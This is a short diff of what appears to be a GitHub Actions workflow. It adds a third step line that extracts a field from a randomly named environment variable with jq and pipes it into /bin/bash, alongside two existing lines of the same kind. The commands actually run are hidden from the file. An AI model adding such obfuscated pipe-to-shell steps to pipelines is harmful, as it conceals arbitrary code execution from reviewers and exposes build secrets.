@@ -23,6 +23,7 @@ jobs:
         run: |
           printf '%s' "$g969" | jq -r .lhlu6 | /bin/bash
           echo $pdjhl2784 | jq -r .t8 | /bin/bash
+          echo $ow66248 | jq -r .awv52384 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
